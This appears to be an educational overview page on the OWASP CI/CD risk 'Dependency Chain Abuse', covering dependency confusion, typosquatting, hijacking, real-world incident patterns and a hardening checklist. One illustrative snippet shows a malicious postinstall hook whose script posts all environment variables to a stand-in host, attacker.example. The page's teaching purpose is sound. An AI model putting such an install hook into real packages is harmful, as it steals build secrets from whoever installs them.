# CICD-SEC-3: Dependency Chain Abuse - Overview

## Table of Contents
- [What is Dependency Chain Abuse?](#what-is-dependency-chain-abuse)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [The Five Abuse Classes](#the-five-abuse-classes)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Signals](#prevalence-and-signals)
- [Common Misunderstandings](#common-misunderstandings)

## What is Dependency Chain Abuse?

**Dependency Chain Abuse** (CICD-SEC-3 in the OWASP Top 10 CI/CD Security Risks) covers every way an attacker can abuse how a build system *fetches* its software dependencies to trick that build into pulling a **malicious package** instead of—or in addition to—the intended one. The flaw is not in the dependency you chose; it is in the *resolution and retrieval process* that decides which artifact actually lands on the build agent.

A modern build declares a handful of direct dependencies, but those pull in hundreds of transitive ones, each fetched from a package registry (npm, PyPI, Maven Central, RubyGems, NuGet, crates.io, Go proxies) according to rules the developer rarely inspects: which registry is consulted first, whether a public registry can shadow a private name, whether a version is pinned or floating, whether an integrity hash is verified, and whether the package is allowed to run code *at install time*. Every one of those decisions is an attack surface. When any of them favours the attacker, arbitrary code executes on the build agent—one of the most privileged, most trusted, and least monitored machines in the software supply chain.

### Core Concept

```
Intended resolution:
  build declares  "@acme/auth-utils"  (internal, private registry)
        -> resolver asks the internal registry
        -> internal registry returns the real 1.4.2
        -> integrity hash matches the lockfile
        -> no install-time code runs

Abused resolution (dependency confusion):
  build declares  "acme-auth-utils"   (no scope, public fallback enabled)
        -> resolver asks BOTH internal and public registries
        -> attacker published "acme-auth-utils" 99.99.99 on the PUBLIC registry
        -> highest version wins  -> public malicious copy is fetched
        -> postinstall script runs  -> code execution on the build agent
```

Dependency Chain Abuse is fundamentally about **trust placed in a name**. Package managers resolve human-friendly names to artifacts, and attackers exploit every gap between "the name the developer typed" and "the bytes the build ran."

### Why It's Critical for CI/CD Pipelines

Build pipelines make this risk uniquely severe:

- The build agent runs installs **non-interactively and automatically**, so a malicious install script executes with no human watching and no browser warning.
- Build agents hold **high-value secrets**: registry tokens, cloud credentials, signing keys, deployment access—exactly what a supply-chain attacker wants.
- Output is **trusted downstream**: whatever the pipeline produces is signed, published, and shipped to every customer, so a single poisoned build fans out widely.
- Dependency resolution is **opaque and transitive**: nobody reviews the 400th indirect package, and one poisoned link taints everything above it.

## Why Does This Matter?

### Business Impact

- **Supply-Chain Compromise**: A malicious dependency baked into your artifact is redistributed to every downstream consumer, turning one break into thousands.
- **Secret and Credential Theft**: Install-time code on the build agent harvests environment variables, cloud metadata, and registry tokens—often the keys to the whole estate.
- **Loss of Release Integrity**: Once a build cannot be trusted, every artifact it produced must be treated as suspect, forcing costly re-builds and re-signing.
- **Reputational and Regulatory Fallout**: Shipping malware to customers triggers disclosure obligations, contractual breach, and lasting trust damage.
- **Time-Bomb Persistence**: A hijacked transitive package can sit dormant for months, so the compromise window is often far wider than the discovery date suggests.

### Technical Impact

- **Remote Code Execution on the Build Agent**: Install scripts and imported module top-level code run as the CI user during `install`.
- **Artifact Poisoning**: Malicious code is compiled or bundled into the deliverable and signed by your own pipeline.
- **Lateral Movement**: The agent's network position and credentials are used to pivot into internal registries, source control, and cloud accounts.
- **Cache and Lockfile Poisoning**: A single malicious resolution can be pinned into a lockfile or shared cache and propagate to every subsequent build.

## Technical Context

### How Package Resolution Actually Works

To understand the abuse, you must understand what "install this dependency" really does. Broadly, a package manager:

1. Reads a manifest (`package.json`, `requirements.txt`, `pom.xml`, `go.mod`).
2. Consults one or more **configured registries / index URLs** to find candidate versions of each name.
3. Applies a **version-selection rule** (semver ranges, "highest wins", nearest-wins) to pick one candidate.
4. Downloads the artifact and—*if configured*—verifies an **integrity hash** against a lockfile.
5. Optionally executes **install-time lifecycle scripts** (npm `preinstall`/`postinstall`, Python `setup.py`, Gradle build logic).

Every abuse class below targets one of those five steps: the *registry it asks*, the *version it picks*, the *name it trusts*, the *hash it fails to check*, or the *script it lets run*.

### The Danger of Install-Time Scripts

```json
// package.json of a malicious package
{
  "name": "acme-internal-utils",
  "version": "99.99.99",
  "scripts": {
    "postinstall": "node ./harvest.js"   // runs automatically on `npm install`
  }
}
```

```js
// harvest.js — executes as the CI user, no prompt, no sandbox
require('https').request('https://attacker.example/collect', { method: 'POST' })
  .end(JSON.stringify(process.env));      // exfiltrate every build secret
```

**Key point**: merely *installing* a dependency—you never have to `import` or run it—can execute attacker code. This is why "we don't use that package directly" is not a defence.

## The Five Abuse Classes

| Class | Mechanism | What the attacker controls |
|-------|-----------|----------------------------|
| **Dependency confusion / substitution** | A public package shadows a private/internal name because the resolver can reach both registries and prefers the higher version | A public name identical to your internal one |
| **Typosquatting** | A package with a name one keystroke away from a popular one (`reqeusts`, `loadsh`) is installed by mistake | A look-alike public name |
| **Brandjacking** | A package impersonates a trusted vendor or namespace to appear official (`acme-official-sdk`) | A public name that borrows a brand's reputation |
| **Dependency hijacking** | Takeover of an existing legitimate package via an abandoned, expired, or compromised maintainer account | A real, already-trusted package you already depend on |
| **Transitive poisoning** | A deep, indirect dependency (not one you chose) is compromised and rides in through the graph | Any package your dependencies depend on |

### 1. Dependency Confusion / Substitution

An organisation uses internally-named packages (for example `acme-auth-utils`) that live only in a private registry. If the build's package manager is configured to fall back to the public registry for names it cannot find privately—or to consult both and pick the highest version—an attacker can publish a package with the *same name* on the public registry at an absurdly high version. The resolver, preferring the higher number, fetches the attacker's copy. No typo, no social engineering: the naming and resolution rules do all the work.

### 2. Typosquatting

Attackers register public names that are a single edit away from popular packages—transposed letters, missing characters, or a hyphen swapped for an underscore. A developer or a generated manifest with a typo pulls the malicious package. Because the name is *almost* right, it survives casual review.

### 3. Brandjacking

A package is named to look like the official offering of a well-known project or company (`<brand>-sdk`, `<brand>-official`, `node-<brand>`). It trades on reputation rather than a typo: the victim believes they are installing a vendor-blessed package.

### 4. Dependency Hijacking (Account / Package Takeover)

Instead of creating a new malicious name, the attacker seizes an *existing* trusted one. Common paths include a maintainer's account with a reused or leaked password and no MFA, an expired domain behind a maintainer's email address (allowing a password reset), or a burned-out maintainer who hands the project to a stranger who then ships malware. Because the package is already in lockfiles across the ecosystem, the poisoned update reaches everyone on their next upgrade.

### 5. Transitive Dependency Poisoning

You vet your direct dependencies, but each of them has its own dependencies, several levels deep. Compromise of any node in that graph—via any of the classes above—flows upward into your build even though you never named the malicious package. Depth hides it: nobody audits the fortieth indirect dependency.

## Real-World Impact

> The cases below are described as **incident classes**—recurring, publicly-documented patterns—rather than specific advisories. The goal is to teach the shape of the attack, not to catalogue individual CVEs.

### Case Class 1: The 2021 Dependency-Confusion Research Wave

**Pattern**:
- A security researcher discovered that many large organisations referenced internal package names that were not claimed on the public registries.
- By publishing public packages with those exact names at high version numbers, benign proof-of-concept code was pulled into the internal builds of numerous major companies.

**Impact**:
- Demonstrated that dependency confusion was not theoretical: build systems across the industry silently preferred the public copy.
- Triggered widespread hardening—scope reservation, registry pinning, and namespace claiming—and remains the canonical example of substitution attacks.

**Root Cause**: Package managers configured to consult a public registry as a fallback (or in parallel) for names that were meant to be private, combined with "highest version wins" selection.

### Case Class 2: Maintainer-Account Hijack of a Popular Utility (event-stream class)

**Pattern**:
- A widely-depended-upon open-source utility was handed over to a new maintainer who had volunteered to help.
- The new maintainer added a malicious transitive dependency that targeted a specific downstream application, hidden inside an obfuscated payload.

**Impact**:
- The malicious code rode into countless projects transitively, illustrating how a single trusted link—deep in the graph—can weaponise the whole ecosystem above it.

**Root Cause**: Social takeover of a trusted maintainer position plus unreviewed transitive dependencies and install/runtime code.

### Case Class 3: Recurring Typosquat and Brandjack Waves

**Pattern**:
- Automated campaigns repeatedly flood public registries (npm, PyPI, and others) with packages whose names mimic popular libraries or well-known brands.
- Many carry install-time scripts that harvest environment variables and tokens the moment they are installed.

**Impact**:
- Registries periodically remove large batches of these packages, but the steady cadence shows the technique is cheap, effective, and continuous.

**Root Cause**: Open self-service publishing, name similarity that survives human review, and install scripts that run automatically.

## Prevalence and Signals

Dependency Chain Abuse is one of the most actively exploited categories in the software supply chain, precisely because it is cheap for the attacker and largely invisible to the victim. Rather than cite precise counts (which vary by source and year), the defensible picture is:

- Public registries receive a **continuous stream** of typosquat, brandjack, and confusion packages; batch removals are routine, not exceptional.
- The most-abused vectors are **unscoped internal names, floating versions, unverified integrity hashes, and enabled install scripts**.
- Impact is rated **severe**: a single successful resolution yields code execution on a highly-privileged build agent and, frequently, downstream artifact poisoning.

> Note: exact package counts and takedown figures differ between reports. Treat any single number as illustrative; the durable takeaway is that abusive packages are published constantly, and a build with weak resolution rules will eventually fetch one.

## Common Misunderstandings

### Myth 1: "We only use reputable, popular packages, so we're safe"

**Reality**: Popular packages get *hijacked*, and your build pulls hundreds of transitive dependencies you never chose. Reputation of your direct picks says nothing about the whole graph.

### Myth 2: "We don't call that package's code, so it can't hurt us"

**Reality**: Install-time scripts (`postinstall`, `setup.py`) run during `install`—before any of your code executes and whether or not you ever import the package.

### Myth 3: "Our internal packages are private, so nobody can target them"

**Reality**: The *name* of an internal package leaks constantly—in error messages, public commits, job postings, and bundles. If the name is unclaimed publicly and your resolver can reach the public registry, it is a dependency-confusion target.

### Myth 4: "A lockfile means we're fully protected"

**Reality**: A lockfile only helps if you also **verify integrity hashes** and install in a locked mode (`npm ci`, `--require-hashes`). A lockfile that is regenerated on every build, or ignored by a loose install command, provides no guarantee.

### Myth 5: "Pinning the version number is enough"

**Reality**: Version pinning stops *floating* upgrades, but a pinned version can still be re-published or resolved from the wrong registry. You must pin the version *and* the integrity hash *and* control which registry answers.

### Myth 6: "Dependency scanning (SCA) will catch it"

**Reality**: SCA is essential but reactive—it flags *known* vulnerable versions. A brand-new typosquat or a fresh malicious version has no advisory yet. Scanning complements, but does not replace, controlling resolution.

## How Dependency Chain Abuse Differs from Related Risks

| Aspect | Dependency Chain Abuse (CICD-SEC-3) | Vulnerable/Outdated Components | Poisoned Pipeline Execution |
|--------|-------------------------------------|--------------------------------|------------------------------|
| **Root cause** | How dependencies are *fetched/resolved* | Known bugs in the version you use | Untrusted code paths in the pipeline definition |
| **Attacker action** | Publish/hijack a package the build resolves | None—the flaw already exists | Inject steps via config/PR |
| **Typical fix** | Control registries, pin + hash, scope names, disable scripts | Patch / upgrade | Isolate and review pipeline triggers |
| **Detection** | Resolution audit, provenance, new-package monitoring | SCA / version audit | Pipeline config review |

## Key Takeaways

1. **The flaw is in resolution, not in the package you chose**—attackers exploit how builds decide which bytes to fetch.
2. **Installing is executing**—lifecycle scripts run automatically on the build agent, no import required.
3. **Names are trust**—confusion, typosquatting, and brandjacking all abuse the gap between a name and an artifact.
4. **Hijacked and transitive packages bypass "reputable-only" policies**—you own the whole graph, not just your direct picks.
5. **Defence is about control**—one trusted registry, claimed names, pinned versions and hashes, and scripts off by default.

## How to Identify if You're Vulnerable

- [ ] Do builds fetch dependencies only from a controlled internal proxy/registry with an allow-list—never directly from public registries?
- [ ] Are all internal package names **scoped** and their scopes/names claimed on the public registries?
- [ ] Is every private scope pinned to the private registry, with **no public fallback**?
- [ ] Are versions pinned *and* integrity hashes verified (lockfile + `npm ci` / `--require-hashes`)?
- [ ] Are install-time scripts disabled or explicitly allow-listed on the build agent?
- [ ] Do you verify package signatures/provenance where the ecosystem supports it?
- [ ] Does SCA run on every build, and do you monitor for newly-published look-alike names?
- [ ] Does the build agent run with least privilege, so a rogue install script gains little?

If you answered "no" or "not sure" to several of these, your pipeline can likely be tricked into fetching a malicious package today.

## Next Steps

- **[Attack Vectors](attack-vectors.md)**: How attackers get a build to fetch their package
- **[Prevention](prevention.md)**: Control resolution with registries, scopes, pinning, and hashes
- **[Examples](examples.md)**: Insecure vs. secure package-manager configuration
- **[CI/CD Security Track](/learn/cicd)**: Continue the OWASP CI/CD Top 10
- **[Practice](/practice)**: Apply these controls hands-on
